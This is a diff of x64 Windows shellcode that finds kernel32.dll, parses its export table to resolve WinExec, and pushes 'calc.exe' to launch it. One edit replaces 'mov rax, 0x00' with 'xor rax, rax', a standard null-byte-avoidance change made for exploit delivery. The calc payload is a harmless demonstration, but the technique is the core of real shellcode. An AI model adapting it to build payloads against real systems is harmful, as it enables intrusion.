@@ -19,7 +19,7 @@ mov r8, rbx         ; mov kernel32.dll base addr into r8
 
 ;Code for parsing Export Address Table
 mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
-add rbx, r8                   ; Add defrerenced signature offset to kernel32 base. Store in RBX.
+add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
 mov edx, [rbx+0x88]           ; Offset from PE32 Signature to Export Address Table
 add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
 mov r10d, [rdx+0x14]          ; Number of functions
@@ -81,7 +81,7 @@ OrdinalLookup:
 executeit:
 ; --- prepare to call WinExec ---
 pop r15                         ;address for WinExec
-mov rax, 0x00
+xor rax, rax
 push rax
 mov rax, 0x6578652E636C6163   ; calc.exe 
 push rax
